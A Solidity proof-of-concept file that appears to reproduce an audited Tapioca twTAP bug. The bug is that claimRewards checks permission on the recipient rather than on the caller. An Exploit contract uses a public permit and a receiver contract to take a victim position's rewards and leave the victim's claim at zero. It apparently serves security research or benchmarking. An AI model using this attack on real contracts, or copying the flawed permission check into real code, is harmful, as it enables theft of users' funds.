// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Tapioca twTAP — claimRewards does not restrict the caller
    (Code4rena 2024-02, finding 32314 / H-03). SYNTHETIC, cheatcode-free.
    claimRewards is the audited function, copied verbatim (@> VULN).
    Root cause: permission is checked on the recipient `_to`, not on msg.sender.
    After a public permit approves TapTokenReceiver, anyone can deliver the
    claim message, take the position's TAP, and leave the owner's claim at 0. */

contract RewardToken {
    string public name = "Tapioca";
    string public symbol = "TAP";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract TwTAP {
    error NotApproved(uint256 tokenId, address caller);

    struct Position {
        address owner;
        uint256 reward;
    }

    RewardToken public reward;
    bool public paused;
    uint256 private _locked = 1;
    mapping(uint256 => Position) public positions;
    mapping(uint256 => address) public getApproved;
    mapping(uint256 => uint256) public claimed;

    constructor(address _reward) {
        reward = RewardToken(_reward);
    }

    modifier nonReentrant() {
        require(_locked == 1, "reentrancy");
        _locked = 2;
        _;
        _locked = 1;
    }

    modifier whenNotPaused() {
        require(!paused, "paused");
        _;
    }

    function seed(uint256 tokenId, address owner, uint256 rewardAmt) external {
        positions[tokenId].owner = owner;
        positions[tokenId].reward = rewardAmt;
    }

    /// Destination-chain permit. The finding states anyone can trigger it.
    function permit(uint256 tokenId, address operator) external {
        getApproved[tokenId] = operator;
    }

    function ownerOf(uint256 tokenId) public view returns (address) {
        return positions[tokenId].owner;
    }

    function _ownerOf(uint256 tokenId) internal view returns (address) {
        return positions[tokenId].owner;
    }

    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view returns (bool) {
        address owner = positions[tokenId].owner;
        return spender == owner || getApproved[tokenId] == spender;
    }

    /// Pearl-style operator approval used by the audited permission check.
    function isERC721Approved(address, address operator, address, uint256 tokenId) public view returns (bool) {
        return getApproved[tokenId] == operator;
    }

    function _requireClaimPermission(address _to, uint256 _tokenId) internal view {
        // @> VULN: checks `_to`, not msg.sender. Any caller can claim to an approved receiver.
        if (!_isApprovedOrOwner(_to, _tokenId) && !isERC721Approved(_ownerOf(_tokenId), _to, address(this), _tokenId)) {
            revert NotApproved(_tokenId, msg.sender);
        }
    }

    function claimable(uint256 _tokenId) public view returns (uint256[] memory amounts) {
        amounts = new uint256[](1);
        uint256 total = positions[_tokenId].reward;
        uint256 already = claimed[_tokenId];
        amounts[0] = total - already;
    }

    /// @dev Claim all rewards on a position and send them to `_to`.
    function _claimRewards(uint256 _tokenId, address _to) internal returns (uint256[] memory amounts) {
        amounts = claimable(_tokenId);
        uint256 len = amounts.length;
        unchecked {
            for (uint256 i = 0; i < len; ++i) {
                uint256 amount = amounts[i];
                if (amount > 0) {
                    // Math is safe: `amount` calculated safely in `claimable()`.
                    claimed[_tokenId] += amount;
                    reward.transfer(_to, amount);
                }
            }
        }
    }

    function claimRewards(uint256 _tokenId, address _to)
        external
        nonReentrant
        whenNotPaused
        returns (uint256[] memory amounts_)
    {
        _requireClaimPermission(_to, _tokenId);
        // FIX: also require the caller to be the position owner. An approved receiver is not enough.
        amounts_ = _claimRewards(_tokenId, _to);
    }
}

/// Reduced TapTokenReceiver. The claim message does not check who sent it.
contract TapTokenReceiver {
    TwTAP public twTap;
    RewardToken public reward;

    constructor(address _twTap, address _reward) {
        twTap = TwTAP(_twTap);
        reward = RewardToken(_reward);
    }

    function claimTwpTapRewards(uint256 tokenId, address sendTo) external returns (uint256 claimedAmount) {
        uint256[] memory amounts = twTap.claimRewards(tokenId, address(this));
        claimedAmount = amounts[0];
        if (claimedAmount != 0) reward.transfer(sendTo, claimedAmount);
    }
}

contract Exploit {
    uint256 public constant TOKEN_ID = 1;
    uint256 public constant REWARD = 1000e18;
    address public constant VICTIM = 0x000000000000000000000000000000000000bEEF;

    RewardToken public reward; // nonce 1
    TwTAP public twTap; // nonce 2
    TapTokenReceiver public receiver; // nonce 3

    uint256 public attackerBalance;
    uint256 public victimClaim;

    constructor() {
        reward = new RewardToken();
        twTap = new TwTAP(address(reward));
        receiver = new TapTokenReceiver(address(twTap), address(reward));
        reward.mint(address(twTap), REWARD);
        twTap.seed(TOKEN_ID, VICTIM, REWARD);
    }

    function run() external {
        uint256 owed = twTap.claimable(TOKEN_ID)[0];
        require(owed == REWARD, "position not funded");

        twTap.permit(TOKEN_ID, address(receiver));
        require(twTap.getApproved(TOKEN_ID) == address(receiver), "permit missed");

        uint256 taken = receiver.claimTwpTapRewards(TOKEN_ID, address(this));
        require(taken == REWARD, "receiver did not forward");

        attackerBalance = reward.balanceOf(address(this));
        require(attackerBalance == REWARD, "attacker was not paid");

        uint256 late = receiver.claimTwpTapRewards(TOKEN_ID, VICTIM);
        victimClaim = late;
        require(victimClaim == 0, "victim still claimable");
        require(reward.balanceOf(VICTIM) == 0, "victim was paid");
        require(reward.balanceOf(address(twTap)) == 0, "rewards still escrowed");
    }
}
